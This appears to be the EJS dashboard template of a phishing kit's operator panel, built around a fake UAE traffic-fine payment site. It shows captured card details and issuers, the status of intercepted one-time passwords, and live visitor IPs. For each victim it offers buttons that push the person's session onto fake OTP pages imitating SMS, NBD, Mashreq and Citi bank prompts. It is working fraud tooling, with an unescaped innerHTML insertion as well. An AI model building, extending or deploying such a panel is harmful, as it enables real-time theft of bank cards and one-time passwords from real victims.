<%- include('_layout', { pageTitle: 'Dashboard', activePage: 'dashboard', adminUser }) %>

<% if (typeof dbError !== 'undefined' && dbError) { %>
<div class="alert alert-error">Database error: <%= dbError %></div>
<% } else { %>

<div class="stat-grid">
  <div class="stat-card c-blue">
    <div class="stat-label">Total Inquiries</div>
    <div class="stat-value"><%= Number(totalInquiries).toLocaleString() %></div>
    <div class="stat-sub">Today: +<%= todayInquiries %></div>
  </div>
  <div class="stat-card c-amber">
    <div class="stat-label">Total Payments</div>
    <div class="stat-value"><%= Number(totalPayments).toLocaleString() %></div>
    <div class="stat-sub">Today: +<%= todayPayments %></div>
  </div>
  <div class="stat-card">
    <div class="stat-label">Pending OTP</div>
    <div class="stat-value" style="color:#b45309;"><%= Number(pendingPayments).toLocaleString() %></div>
    <div class="stat-sub">Approved: <%= approvedPayments %></div>
  </div>
  <div class="stat-card c-green">
    <div class="stat-label">Total Revenue</div>
    <div class="stat-value">AED <%= Number(totalRevenue).toLocaleString() %></div>
    <div class="stat-sub">All payments</div>
  </div>
</div>

<!-- Live visitor widget -->
<style>
@keyframes live-pulse { 0%,100% { box-shadow:0 0 0 0 rgba(34,197,94,0.45); } 50% { box-shadow:0 0 0 8px rgba(34,197,94,0); } }
.live-wrap { display:grid; grid-template-columns: 1fr 2fr; gap:14px; margin-bottom:24px; }
.live-card { background:var(--bg-card); border:1px solid var(--bd); border-radius:12px; padding:18px 20px; }
.live-head { display:flex; align-items:center; gap:10px; margin-bottom:14px; }
.live-dot { width:10px; height:10px; background:#22c55e; border-radius:50%; animation:live-pulse 1.5s infinite; }
.live-title { font-size:12px; font-weight:700; color:var(--tx-muted); text-transform:uppercase; letter-spacing:.5px; }
.live-num { font-size:36px; font-weight:800; color:#006837; line-height:1; }
.live-sub { font-size:12px; color:var(--tx-muted); margin-top:6px; }
.live-list { max-height:240px; overflow-y:auto; }
.live-item { display:flex; gap:10px; padding:8px 0; border-bottom:1px solid var(--bd-light); font-size:13px; align-items:center; }
.live-item:last-child { border-bottom:none; }
.live-ip { font-family:'SFMono-Regular',Consolas,monospace; font-size:12px; color:var(--tx-mid); width:120px; flex-shrink:0; }
.live-path { font-family:'SFMono-Regular',Consolas,monospace; font-size:12px; color:var(--tx-base); flex:1; min-width:0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
.live-link { font-size:11px; color:#006837; text-decoration:none; flex-shrink:0; }
@media (max-width: 900px) { .live-wrap { grid-template-columns: 1fr; } .live-ip { width:auto; } }
</style>
<div class="live-wrap">
  <div class="live-card">
    <div class="live-head">
      <div class="live-dot"></div>
      <div class="live-title">Live Now</div>
    </div>
    <div class="live-num" id="dash-live-count">—</div>
    <div class="live-sub">visitors active in last 60s</div>
    <div style="margin-top:14px;border-top:1px solid var(--bd-light);padding-top:14px;">
      <div class="live-title">Last 30 min</div>
      <div style="font-size:22px;font-weight:800;color:var(--tx-base);margin-top:4px;" id="dash-30m-count">—</div>
      <div class="live-sub">unique visitors</div>
    </div>
  </div>
  <div class="live-card">
    <div class="live-head">
      <div class="live-dot"></div>
      <div class="live-title">Active Visitors</div>
      <a href="/admin/sessions?active=1" class="btn btn-ghost btn-sm" style="margin-left:auto;">View all →</a>
    </div>
    <div class="live-list" id="dash-active-list">
      <div style="color:var(--tx-muted);padding:14px 0;font-size:13px;">Loading…</div>
    </div>
  </div>
</div>

<script>
async function dashRefreshLive() {
  try {
    const r = await fetch('/admin/api/live-stats', { credentials: 'same-origin' });
    const d = await r.json();
    if (!d.ok) return;
    document.getElementById('dash-live-count').textContent = d.liveCount;
    document.getElementById('dash-30m-count').textContent  = d.last30;
    const list = document.getElementById('dash-active-list');
    if (d.active.length === 0) {
      list.innerHTML = '<div style="color:var(--tx-muted);padding:14px 0;font-size:13px;">No active visitors right now.</div>';
    } else {
      list.innerHTML = d.active.map(function(v) {
        return '<div class="live-item">' +
          '<span class="live-ip">' + (v.ip || '—') + '</span>' +
          '<span class="live-path" title="' + v.current_path + '">' + v.current_path + '</span>' +
          '<a href="/admin/sessions/' + v.visitor_id + '" class="live-link">view →</a>' +
        '</div>';
      }).join('');
    }
  } catch(e) {}
}
dashRefreshLive();
setInterval(dashRefreshLive, 5000);
</script>

<!-- Recent Payments -->
<div class="table-card">
  <div class="tc-header">
    <div class="tc-title">Recent Payments</div>
    <a href="/admin/payments" class="btn btn-ghost btn-sm">View all</a>
  </div>
  <div style="overflow-x:auto;">
  <table>
    <thead>
      <tr>
        <th>Date</th><th>Plate</th><th>Amount</th><th>Card</th><th>Issuer</th><th>OTP Page</th><th>Status</th><th>Actions</th>
      </tr>
    </thead>
    <tbody>
    <% if (recentPayments.length === 0) { %>
    <tr><td colspan="8" style="text-align:center;padding:32px;color:#94a3b8;">No payment records found.</td></tr>
    <% } %>
    <% recentPayments.forEach(function(p) {
      const sc = {pending:'b-pending',approved:'b-approved',declined:'b-declined',otp_received:'b-received'}[p.otp_status] || 'b-pending';
      const last4 = (p.card_number||'').replace(/\s/g,'').slice(-4) || '????';
      const dt = p.created_at ? new Date(p.created_at).toLocaleString('en-AE',{timeZone:'Asia/Dubai',day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'}) : '-';
    %>
    <tr>
      <td class="small muted nowrap"><%= dt %></td>
      <td><strong><%= p.plate_src %></strong> <%= p.plate_code %> <%= p.plate_no %></td>
      <td class="text-green">AED <%= Number(p.total_fine).toLocaleString() %></td>
      <td class="mono">****<%= last4 %></td>
      <td class="small"><%= p.card_issuer || '—' %></td>
      <td><span class="badge b-otp"><%= p.otp_page || 'otp-sms' %></span></td>
      <td><span class="badge <%= sc %>"><%= p.otp_status %></span></td>
      <td>
        <div class="action-bar">
          <button class="btn btn-sm btn-blue"   onclick="redirect('<%= p.sid %>','otp-sms')">SMS</button>
          <button class="btn btn-sm btn-purple"  onclick="redirect('<%= p.sid %>','otp')">NBD</button>
          <button class="btn btn-sm btn-amber"   onclick="redirect('<%= p.sid %>','otp-mashreq')">Mashreq</button>
          <button class="btn btn-sm btn-ghost"   onclick="redirect('<%= p.sid %>','otp-citi')">Citi</button>
        </div>
      </td>
    </tr>
    <% }) %>
    </tbody>
  </table>
  </div>
</div>

<!-- Recent Inquiries -->
<div class="table-card">
  <div class="tc-header">
    <div class="tc-title">Recent Plate Inquiries</div>
    <a href="/admin/inquiries" class="btn btn-ghost btn-sm">View all</a>
  </div>
  <div style="overflow-x:auto;">
  <table>
    <thead>
      <tr><th>Date</th><th>Plate</th><th>Fines</th><th>Total AED</th><th>IP</th></tr>
    </thead>
    <tbody>
    <% if (recentInquiries.length === 0) { %>
    <tr><td colspan="5" style="text-align:center;padding:32px;color:#94a3b8;">No inquiry records found.</td></tr>
    <% } %>
    <% recentInquiries.forEach(function(i) {
      const dt = i.created_at ? new Date(i.created_at).toLocaleString('en-AE',{timeZone:'Asia/Dubai',day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'}) : '-';
    %>
    <tr>
      <td class="small muted nowrap"><%= dt %></td>
      <td><strong><%= i.plate_src %></strong> <%= i.plate_code %> <%= i.plate_no %></td>
      <td>
        <% if (i.fine_count > 0) { %><strong style="color:#dc2626"><%= i.fine_count %></strong><% } else { %><span class="muted">0</span><% } %>
      </td>
      <td>
        <% if (i.total_amount > 0) { %>AED <%= Number(i.total_amount).toLocaleString() %><% } else { %><span class="muted">—</span><% } %>
      </td>
      <td class="mono muted small"><%= i.ip || '—' %></td>
    </tr>
    <% }) %>
    </tbody>
  </table>
  </div>
</div>

<% } %>

<script>
function redirect(sid, page) {
  if (!confirm('Redirect user to ' + page + '?\n(User must be active on an OTP page.)')) return;
  adminAction({ act: 'redirect', sid, page });
}
</script>

<%- include('_layout_end') %>
